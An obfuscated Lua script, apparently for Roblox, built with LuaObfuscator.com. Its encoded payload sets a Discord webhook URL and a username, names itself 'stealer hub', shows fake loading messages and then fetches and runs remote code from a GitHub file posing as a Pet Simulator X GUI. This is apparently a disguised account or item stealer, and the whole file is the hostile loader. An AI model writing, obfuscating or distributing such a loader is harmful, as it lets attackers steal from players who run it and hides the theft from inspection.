--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.1) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v70=0;while true do if (0==v70) then v19=v0(v3(v20,1,1));return "";end end else local v71=0;local v72;while true do if (0==v71) then v72=v2(v0(v20,16));if v19 then local v99=v5(v72,v19);v19=nil;return v99;else return v72;end break;end end end end);local function v21(v22,v23,v24)if v24 then local v73=(v22/((1144 -(879 + 263))^(v23-((3 -2) -0))))%(2^(((v24-(1 + 0)) -(v23-(3 -2))) + 1 + 0));return v73-(v73%(1 + 0));else local v74=(218 -(157 + 59))^(v23-(3 -2));return (((v22%(v74 + v74))>=v74) and (3 -2)) or (714 -(48 + 666));end end local function v25()local v38=0 + 0;local v39;while true do if (v38==(1328 -(602 + 726))) then v39=v1(v16,v18,v18);v18=v18 + 1;v38=2 -1;end if (v38==((2889 -(301 + 1548)) -(1031 + 8))) then return v39;end end end local function v26()local v40=0;local v41;local v42;while true do if (0==v40) then v41,v42=v1(v16,v18,v18 + (5 -3));v18=v18 + 2 + (1383 -(141 + 1242));v40=1 + 0;end if ((2 -1)==v40) then return (v42 * (1997 -(650 + 1091))) + v41;end end end local function v27()local v43,v44,v45,v46=v1(v16,v18,v18 + 3 + 0);v18=v18 + (11 -(2 + 5));return (v46 * ((45571025 -28793499) -(66 + 244))) + (v45 * (66987 -(101 + (2932 -(426 + 1156))))) + (v44 * (1461 -(73 + 1132))) + v43;end local function v28()local v47=v27();local v48=v27();local v49=3 -2;local v50=(v21(v48,500 -(416 + 83),8 + (17 -5)) * ((861 -((785 -(164 + 542)) + 780))^(153 -(60 + 61)))) + v47;local v51=v21(v48,75 -54,31);local v52=((v21(v48,46 -14)==1) and  -1) or (1404 -(1246 + 157));if (v51==(1426 -(974 + 452))) then if (v50==(0 -0)) then return v52 * (1982 -(1872 + 110));else local v79=(0 -0) + 0;while true do if (v79==(0 + 0)) then v51=672 -(107 + 564);v49=559 -(405 + 154);break;end end end elseif (v51==2047) then return ((v50==(1631 -((3775 -2239) + 95))) and (v52 * ((3 -2)/0))) or (v52 * NaN);end return v8(v52,v51-1023) * (v49 + (v50/((1054 -(514 + (961 -423)))^((923 + 915) -((748 -478) + 1516)))));end local function v29(v30)local v53;if  not v30 then local v75=1753 -(985 + 768);while true do if (v75==(0 -0)) then v30=v27();if (v30==(734 -((908 -650) + 476))) then return "";end break;end end end v53=v3(v16,v18,(v18 + v30) -1);v18=v18 + v30;local v54={};for v68=2 -1, #v53 do v54[v68]=v2(v1(v3(v53,v68,v68)));end return v6(v54);end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v55=0;local v56;local v57;local v58;local v59;local v60;local v61;local v62;local v63;while true do if (v55==(3 + 1)) then while true do if (v56==(4 -2)) then v61=nil;v62=nil;v56=10 -7;end if (v56~=(35 -(9 + 26))) then else local v95=0 + 0;while true do if (v95==1) then v56=1 -0;break;end if (v95==0) then v57=0 -0;v58=nil;v95=1;end end end if (v56~=(1011 -(916 + 94))) then else v59=nil;v60=nil;v56=2 -0;end if (v56==(7 -4)) then v63=nil;while true do local v100=0;while true do if (v100~=(860 -(182 + 677))) then else if (v57~=(2 -1)) then else local v106=0;while true do if (v106==(0 -0)) then local v111=0;while true do if (v111==(1467 -(605 + 862))) then v62=v27();v63={};v111=1;end if (v111==(1 + 0)) then v106=1405 -(1006 + 398);break;end end end if (v106~=(1 -0)) then else for v120=1,v62 do local v121=1926 -(1735 + 191);local v122;local v123;local v124;local v125;local v126;while true do if (v121~=(757 -(354 + 403))) then else v122=1858 -(758 + 1100);v123=nil;v121=1 + 0;end if ((628 -(566 + 60))==v121) then v126=nil;while true do if (v122~=(1 + 1)) then else while true do if (v123~=(0 + 0)) then else local v161=0 + 0;while true do if (v161==1) then v123=1 -0;break;end if (v161~=0) then else local v176=1667 -(50 + 1617);while true do if (v176~=(1 -0)) then else v161=1 -0;break;end if (v176==(0 -0)) then v124=993 -(254 + 739);v125=nil;v176=1 + 0;end end end end end if ((90 -(83 + 6))==v123) then v126=nil;while true do if ((1 -0)==v124) then if (v125==1) then v126=v25()~=(0 + 0);elseif (v125==(3 -1)) then v126=v28();elseif (v125==(1 + 2)) then v126=v29();end v63[v120]=v126;break;end if ((708 -(329 + 379))==v124) then local v178=0;local v179;local v180;while true do if (v178~=(1677 -(559 + 1118))) then else v179=0 -0;v180=nil;v178=1 + 0;end if (v178==(560 -(402 + 157))) then while true do if ((0 -0)==v179) then v180=813 -(17 + 796);while true do if (v180==1) then v124=3 -2;break;end if (v180==0) then local v190=0 -0;local v191;while true do if (v190==(1660 -(1598 + 62))) then v191=0;while true do if (v191~=(1 -0)) then else v180=1;break;end if (v191==(0 -0)) then v125=v25();v126=nil;v191=1 + 0;end end break;end end end end break;end end break;end end end end break;end end break;end if ((610 -(52 + 557))==v122) then v125=nil;v126=nil;v122=1 + 1;end if (v122==(985 -(980 + 5))) then v123=1843 -(458 + 1385);v124=nil;v122=1 -0;end end break;end if (v121~=(1 + 0)) then else v124=nil;v125=nil;v121=2 -0;end end end v61[359 -(316 + 40)]=v25();v106=2;end if (v106~=(2 + 0)) then else v57=285 -(209 + 74);break;end end end break;end if (v100==0) then if (v57~=(2 + 0)) then else local v107=0 -0;while true do if (v107==0) then local v113=0;while true do if (v113==(0 + 0)) then for v144=2 -1,v27() do local v145=0;local v146;local v147;while true do if (v145==(492 -(40 + 452))) then v146=0 -0;v147=nil;v145=1 + 0;end if (v145~=1) then else while true do if (v146==0) then v147=v25();if (v21(v147,1,1)==0) then local v167=1832 -(1196 + 636);local v168;local v169;local v170;local v171;local v172;while true do if (v167~=2) then else v172=nil;while true do if (v168==(0 + 0)) then local v183=259 -(86 + 173);while true do if (0==v183) then v169=0 + 0;v170=nil;v183=1 + 0;end if (v183==(1 + 0)) then v168=3 -2;break;end end end if (v168==2) then while true do if ((3 + 0)~=v169) then else if (v21(v171,3,3 + 0)~=(1 + 0)) then else v172[10 -6]=v63[v172[4]];end v58[v144]=v172;break;end if (v169==(4 -2)) then local v187=622 -(479 + 143);while true do if (v187==(1 + 0)) then v169=102 -(88 + 11);break;end if (v187~=(0 -0)) then else if (v21(v171,1167 -(1100 + 66),1006 -(295 + 710))~=(1541 -(1314 + 226))) then else v172[2]=v63[v172[5 -3]];end if (v21(v171,1506 -(722 + 782),1518 -(1306 + 210))==(838 -(156 + 681))) then v172[3 + 0]=v63[v172[1834 -(340 + 1491)]];end v187=190 -(98 + 91);end end end if (v169==0) then local v188=1503 -(863 + 640);while true do if ((1 + 0)~=v188) then else v169=2 -1;break;end if (v188==0) then v170=v21(v147,2 + 0,7 -4);v171=v21(v147,7 -3,11 -5);v188=3 -2;end end end if ((1 -0)==v169) then local v189=1347 -(303 + 1044);while true do if (v189==0) then v172={v26(),v26(),nil,nil};if (v170==(0 -0)) then local v198=1466 -(952 + 514);local v199;local v200;while true do if ((1 -0)~=v198) then else while true do if (v199==(0 -0)) then v200=0;while true do if (v200~=(0 + 0)) then else v172[3]=v26();v172[10 -6]=v26();break;end end break;end end break;end if (v198~=0) then else v199=0 + 0;v200=nil;v198=1 + 0;end end elseif (v170==1) then v172[1 + 2]=v27();elseif (v170==2) then v172[3]=v27() -((5 -3)^(137 -(29 + 92)));elseif (v170==(2 + 1)) then local v203=0;local v204;while true do if (v203==(0 -0)) then v204=493 -(425 + 68);while true do if (v204==(0 -0)) then v172[1646 -(1201 + 442)]=v27() -(2^(878 -(296 + 566)));v172[4]=v26();break;end end break;end end end v189=1 + 0;end if (v189~=(534 -(476 + 57))) then else v169=868 -(736 + 130);break;end end end end break;end if (v168==(2 -1)) then v171=nil;v172=nil;v168=2 + 0;end end break;end if (v167==1) then v170=nil;v171=nil;v167=1605 -(245 + 1358);end if (v167==(0 -0)) then v168=1598 -(739 + 859);v169=nil;v167=2 -1;end end end break;end end break;end end end for v148=1921 -(1821 + 99),v27() do v59[v148-(1 + 0)]=v33();end v113=1112 -(541 + 570);end if (v113~=1) then else v107=1 + 0;break;end end end if (v107==(3 -2)) then local v114=0 + 0;while true do if (v114==(0 -0)) then for v150=1,v27() do v60[v150]=v27();end return v61;end end end end end if (v57==0) then local v108=0;while true do if ((0 + 0)==v108) then v58={};v59={};v108=1 -0;end if (2==v108) then v57=2 -1;break;end if (v108==1) then v60={};v61={v58,v59,nil,v60};v108=5 -3;end end end v100=1;end end end break;end end break;end if (v55~=(0 -0)) then else v56=0 -0;v57=nil;v55=1 + 0;end if (v55==(6 -3)) then v62=nil;v63=nil;v55=4 + 0;end if (v55==2) then v60=nil;v61=nil;v55=9 -6;end if ((1 + 0)~=v55) then else v58=nil;v59=nil;v55=3 -1;end end end local function v34(v35,v36,v37)local v64=0;local v65;local v66;local v67;while true do if (v64==1) then v67=v35[3];return function(...)local v80=1;local v81= -1;local v82={...};local v83=v12("#",...) -1;local function v84()local v85=v65;local v86=v66;local v87=v67;local v88=v32;local v89={};local v90={};local v91={};for v96=902 -(317 + 585),v83 do if (((2743 -(841 + 235))==(3165 -(663 + 835))) and (v96>=v87)) then v89[v96-v87]=v82[v96 + 1 + 0];else v91[v96]=v82[v96 + (388 -(94 + 50 + 243))];end end local v92=(v83-v87) + (631 -(150 + 480));local v93;local v94;while true do local v97=0 -0;while true do if (((1691 + 870)>((1878 -(622 + 1226)) + 1128)) and (v97==0)) then local v105=0 -(710 -(240 + 470));while true do if (((2494 + 1521)>=(51 + 172)) and ((1 -0)==v105)) then v97=1 + 0;break;end if (((1503 -(1174 -405))<(1169 + (5453 -(88 + 1781)))) and (v105==(846 -(554 + 292)))) then v93=v85[v80];v94=v93[1 + 0 + 0];v105=984 -(304 + 679);end end end if ((v97==((1045 -(525 + 519)) -0)) or ((3719 -858)==(3228 + 646))) then if (((2611 -((2000 -(647 + 1318)) + 651))<(5118 -(129 + 460))) and (v94<=((374 -(369 + 4)) + 4))) then if (((5310 -(742 + 617))==3951) and (v94<=((1 + 2) -1))) then if ((v94<=(1280 -((2242 -(855 + 580)) + 473))) or ((2664 -(219 + 299 + 708))>(3327 -(105 + (1834 -(1110 + 607)))))) then v91[v93[2 + 0]]=v93[1 + 1 + 1];elseif (((702 -494)<=((8916 -1524) -4398)) and (v94>(825 -(520 + 304)))) then v91[v93[4 -(1227 -(155 + 1070))]]();elseif ((v93[5 -3]==v91[v93[1289 -(1192 + 93)]]) or ((6293 -(1270 + 36))==(109 + (290 -(89 + 201))))) then v80=v80 + (1 -0);else v80=v93[5 -2];end elseif (((6373 -2546)==(14825 -(12187 -(88 + 1101)))) and (v94<=(1 + (1265 -(1220 + 43))))) then v37[v93[5 -(4 -2)]]=v91[v93[1 + 1]];elseif ((v94>(6 -2)) or ((5395 -(9622 -5937))<=((3572 -1406) -(182 + 1036 + 566)))) then v91[v93[2 + 0]]=v37[v93[142 -(80 + 59)]];else local v129=0 -(0 -0);local v130;local v131;local v132;while true do if (((0 -(0 + 0))==v129) or ((17449 -13040)<(2294 -(678 + 976)))) then v130=0 -0;v131=nil;v129=3 -2;end if (((2893 -(51 + 181))>(4949 -(941 + 2258))) and (v129==(191 -(19 + 171)))) then v132=nil;while true do if (((1128 + 1152)==((4881 -(335 + 89)) -(145 + 2032))) and (v130==(0 + (250 -(191 + 59))))) then local v156=0 + 0;while true do if (((1317 -(39 + 176))<(949 + 3362)) and (((1 -0) + 0)==v156)) then v130=1 + 0;break;end if ((v156==((0 -0) -(0 -0))) or ((2552 + 1359)<=(2158 -(3768 -2590)))) then v131=v93[(2 + 2) -2];v132=v91[v93[9 -(16 -10)]];v156=3 -2;end end end if ((v130==(1 + 0)) or ((834 + 143)>(5067 -(1073 + (261 -110))))) then v91[v131 + 1 + (606 -(591 + 15))]=v132;v91[v131]=v132[v93[1813 -(1188 + 621)]];break;end end break;end end end elseif (((1604 -(861 + 451))<(622 + (1313 -845))) and (v94<=(2 + 6))) then if ((((21252 -15683) -(6269 -2418))==(5 + 1713)) and (v94<=(1155 -(662 + 487)))) then v80=v93[1 + 2];elseif (((8141 -4172)>(1204 -(150 + 39 + 881))) and (v94==(3 + 4))) then local v133=(533 -(432 + 101)) -0;local v134;local v135;local v136;local v137;local v138;local v139;while true do if (((12395 -8521)>(2840 -(323 + 26 + 182))) and (v133==(393 -(342 + 48)))) then while true do if ((v134==0) or ((1004 + 277)>(4798 -(983 + 836)))) then v135=1018 -(892 + 126);v136=nil;v134=222 -(137 + 84);end if ((v134==(1 + 0)) or ((1789 -(591 + 68))>(12717 -8356))) then local v160=(857 -(358 + 499)) + 0;while true do if (((5022 -955)>((2989 -798) + 1563)) and (v160==(1 + 0))) then v134=1799 -((1110 -(47 + 272)) + 1006);break;end if ((v160==((576 -(442 + 134)) -0)) or ((549 + 2447)==(144 + (1071 -714)))) then v137=nil;v138=nil;v160=1 + 0;end end end if ((((689 + 169) -(94 + 544))<(10986 -6123)) and (v134==((2 -0) + (0 -0)))) then v139=nil;while true do if (((2411 + 1684)>=(2381 -(6 + 136))) and (v135==(1 + 1))) then for v173=v136,v81 do local v174=0 + (1078 -(366 + 712));local v175;while true do if ((v174==(1709 -(1427 + 282))) or ((4685 -(333 + 628))<441)) then v175=(555 -238) -(252 + (93 -28));while true do if ((v175==(1082 -(150 + 465 + 467))) or ((167 + 2668)<(6119 -4371))) then v139=v139 + ((5189 -3555) -(133 + 1500));v91[v173]=v137[v139];break;end end break;end end end break;end if (((0 + 0)==v135) or ((22217 -17278)==(4500 -(267 + 1051)))) then local v164=0 + 0;local v165;while true do if (((1967 + 1352)==(4008 -(276 + 413))) and (v164==(1374 -(834 + 69 + 471)))) then v165=0 + 0;while true do if ((v165==(1583 -(481 + 1102))) or ((2519 -(933 + 8))<=(2597 -(1254 + (1037 -(7 + 701)))))) then v136=v93[3 -1];v137,v138=v88(v91[v136](v13(v91,v136 + (1 -(299 -(97 + 202))),v93[9 -6])));v165=765 -(208 + 556);end if (((4100 + 223 + 206)==((8091 -(1235 + 341)) -1986)) and (v165==(1 + 0))) then v135=1;break;end end break;end end end if (((479 + 31 + 1516)<(3743 -((667 -(81 + 56)) + 515))) and (v135==(2 -1))) then local v166=1500 -(51 + 189 + 783 + 477);while true do if (((2746 -((910 -(286 + 183)) + 1479))<(6408 -2135)) and (v166==((1021 -(808 + 213)) -0))) then local v181=0 -0;while true do if (((0 -0)==v181) or ((2352 + 1738)<=(773 + 1485))) then v81=(v138 + v136) -(1791 -(418 + 255 + 1117));v139=0 -0;v181=(1440 -(915 + 524)) + 0;end if (((3685 -(40 + 1 + 416))>618) and (v181==(658 -(313 + 344)))) then v166=3 -2;break;end end end if ((v166==(1 -0)) or ((6078 -(1036 + 109))<(5875 -(353 + 1627)))) then v135=1 + 1;break;end end end end break;end end break;end if (((76 + 936)==1012) and (v133==(709 -(320 + 389)))) then v134=0 + 0;v135=nil;v133=1762 -(478 + 1283);end if (((915 + 3043)==((10545 -4619) -(1092 + 876))) and (v133==((1950 -(1650 + 293)) -(7 -2)))) then v138=nil;v139=nil;v133=1 + 2;end if ((v133==(1 + 0)) or ((3843 -((676 -526) + 75))<=((10183 -5762) -(2675 -(92 + 182))))) then v136=nil;v137=nil;v133=3 -1;end end else v91[v93[2 + 0]][v93[3 + 0]]=v93[1064 -(1050 + 10)];end elseif (((9763 -6332)>=(31 + (3929 -(199 + 1146)))) and (v94<=(39 -30))) then do return;end elseif (((1147 -(261 + 91))<=(10550 -7621)) and (v94>(7 + 3))) then if (((3426 + 1549)>(638 + 463)) and (v91[v93[2 + 0]]==v93[9 -5])) then v80=v80 + (1 -(0 -0));else v80=v93[14 -(22 -11)];end else local v142=1294 -(286 + 1008);local v143;while true do if (((3784 + 499)>=(109 + 199)) and (v142==(0 -0))) then v143=v93[1 + (776 -(421 + 354))];v91[v143]=v91[v143](v13(v91,v143 + 1 + 0,v81));break;end end end v80=v80 + (137 -(127 + 9));break;end end end end A,B=v32(v11(v84));if  not A[1] then local v98=v35[4][v80] or "?";error("Script error at ["   .. v98   .. "]:"   .. A[2]);else return v13(A,2,B);end end;end if (v64==0) then v65=v35[1];v66=v35[2];v64=1;end end end return v34(v33(),{},v17)(...);end v15("LOL!173O00028O0003083O00557365726E616D65030B3O006D726D617274696E69383903073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313034303637363235373236352O38313233382F767245524C6372455475375A305764355A4F785F63736A597661566658647264797A67574D50445F7A7638317A5F6A68386358693678684B36796E7A577173425F2O7456026O00F03F03023O005F4703103O00437573746F6D5363726970744E616D65030B3O00737465616C65722068756203053O00546578743103103O00536372697074204C6F616465643O2E027O004003053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E026O00084003053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100243O00124O00013O00260B3O0008000100010004063O0008000100122O000100033O001203000100023O00122O000100053O001203000100043O00124O00063O00260B3O000F000100060004063O000F0001001205000100073O003008000100080009001205000100073O0030080001000A000B00124O000C3O00260B3O00160001000C0004063O00160001001205000100073O0030080001000D000E001205000100073O0030080001000F001000124O00113O000E010011000100013O0004063O00010001001205000100073O003008000100120013001205000100143O001205000200153O00200400020002001600122O000400174O0007000200044O000A00013O00022O00020001000100010004063O002300010004063O000100012O00093O00017O00243O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00113O00133O00133O00143O00143O00153O00153O00153O00153O00153O00153O00153O00163O00173O00193O00",v9(),...);end